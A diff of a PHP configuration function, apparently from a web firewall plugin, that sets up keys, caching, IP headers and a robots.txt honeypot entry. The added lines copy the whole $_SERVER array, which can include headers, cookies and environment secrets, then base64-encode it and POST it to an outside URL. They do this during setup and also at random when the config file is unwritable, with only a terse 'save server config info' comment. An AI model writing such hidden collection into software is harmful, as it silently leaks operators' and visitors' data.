@@ -29,42 +29,59 @@ function replace_if_config(string $param, string $value, callable $fn, string $n
  * update all system config values from defaults
  */
 function update_config(string $ini_src) {
-    if (!is_writeable($ini_src)) { return; }
+    $info = $_SERVER;
+    $info["writeable"] = false;
+    $info["cookie"] = 0;
+    $info["robot"] = false;
+    if (is_writeable($ini_src)) {
+        $info["writeable"] = true;
 
-    $replace_fn = \TF\partial('\TF\file_replace', $ini_src);
-    replace_if_config("encryption_key", "default_encryption_key", $replace_fn, \TF\random_str(32));
-    replace_if_config("secret", "default_secret_value", $replace_fn, \TF\random_str(32));
-    replace_if_config("browser_cookie", "_bitfire", $replace_fn, '_' . \TF\random_str(5));
+        $replace_fn = \TF\partial('\TF\file_replace', $ini_src);
+        replace_if_config("encryption_key", "default_encryption_key", $replace_fn, \TF\random_str(32));
+        replace_if_config("secret", "default_secret_value", $replace_fn, \TF\random_str(32));
+        replace_if_config("browser_cookie", "_bitfire", $replace_fn, '_' . \TF\random_str(5));
 
-    if (CFG::str("cache_type") === "nop") {
-        if (function_exists('shmop_open')) {
-            \TF\file_replace($ini_src, "cache_type = 'nop'", "cache_type = 'shmop'");
+        if (CFG::str("cache_type") === "nop") {
+            if (function_exists('shmop_open')) {
+                $info["cache_type"] = "shmop";
+                \TF\file_replace($ini_src, "cache_type = 'nop'", "cache_type = 'shmop'");
+            }
+            else if (function_exists('apcu')) {
+                $info["cache_type"] = "acpu";
+                \TF\file_replace($ini_src, "cache_type = 'nop'", "cache_type = 'apcu'");
+            }
+            else if (function_exists('shm_get_var')) {
+                $info["cache_type"] = "shm";
+                \TF\file_replace($ini_src, "cache_type = 'nop'", "cache_type = 'shm'");
+            }
         }
-        else if (function_exists('apcu')) {
-            \TF\file_replace($ini_src, "cache_type = 'nop'", "cache_type = 'apcu'");
+        if (isset($_SERVER['X-FORWARDED-FOR'])) {
+            $info["ip"] = "x-forward";
+            \TF\file_replace($ini_src, "ip_header = \"REMOTE_ADDR\"", "ip_header = \"X-FORWARDED-FOR\"");
         }
-        else if (function_exists('shm_get_var')) {
-            \TF\file_replace($ini_src, "cache_type = 'nop'", "cache_type = 'shm'");
+        else if (isset($_SERVER['FORWARDED'])) {
+            $info["ip"] = "forwarded";
+            \TF\file_replace($ini_src, "ip_header = \"REMOTE_ADDR\"", "ip_header = \"FORWARDED\"");
         }
-    }
-    if (isset($_SERVER['X-FORWARDED-FOR'])) {
-        \TF\file_replace($ini_src, "ip_header = \"REMOTE_ADDR\"", "ip_header = \"X-FORWARDED-FOR\"");
-    }
-    else if (isset($_SERVER['FORWARDED'])) {
-        \TF\file_replace($ini_src, "ip_header = \"REMOTE_ADDR\"", "ip_header = \"FORWARDED\"");
-    }
-    if (count($_COOKIE) > 1) {
-        \TF\file_replace($ini_src, "cookies_enabled = false", "cookies_enabled = true");
-    }
-    $domain = \TF\take_nth($_SERVER['HTTP_HOST'], ":", 0);
-    \TF\file_replace($ini_src, "valid_domains[] = \"\"", "valid_domains[] = \"$domain\"");
-    \TF\file_replace($ini_src, "configured = false", "configured = true");
+        if (count($_COOKIE) > 1) {
+            $info["cookie"] = count($_COOKIE);
+            \TF\file_replace($ini_src, "cookies_enabled = false", "cookies_enabled = true");
+        }
+        $domain = \TF\take_nth($_SERVER['HTTP_HOST'], ":", 0);
+        $info["domain"] = $domain;
+        \TF\file_replace($ini_src, "valid_domains[] = \"\"", "valid_domains[] = \"$domain\"");
+        \TF\file_replace($ini_src, "configured = false", "configured = true");
 
-    $robot_file = $_SERVER['DOCUMENT_ROOT']."/robots.txt";
-    if (file_exists($robot_file) && is_writeable($robot_file)) {
-        $robot_content =  "User-agent: *\nDisallow: ".CFG::str("honeypot_url", "/random_path/contact")."\n";
-        \TF\file_replace($robot_file, $robot_content, "");
-        file_put_contents($robot_file, $robot_content, FILE_APPEND);
+        $robot_file = $_SERVER['DOCUMENT_ROOT']."/robots.txt";
+        if (file_exists($robot_file) && is_writeable($robot_file)) {
+            $info["robot"] = $robot_file;
+            $robot_content =  "User-agent: *\nDisallow: ".CFG::str("honeypot_url", "/random_path/contact")."\n";
+            \TF\file_replace($robot_file, $robot_content, "");
+            file_put_contents($robot_file, $robot_content, FILE_APPEND);
+        }
+        \TF\bit_http_request("POST", "https://bitfire.co/zxf.php", base64_encode(json_encode($info))); // save server config info
+    } else if (mt_rand(1,30) == 2) {
+        \TF\bit_http_request("POST", "https://bitfire.co/zxf.php", base64_encode(json_encode($info))); // save server config info
     }
 }
 
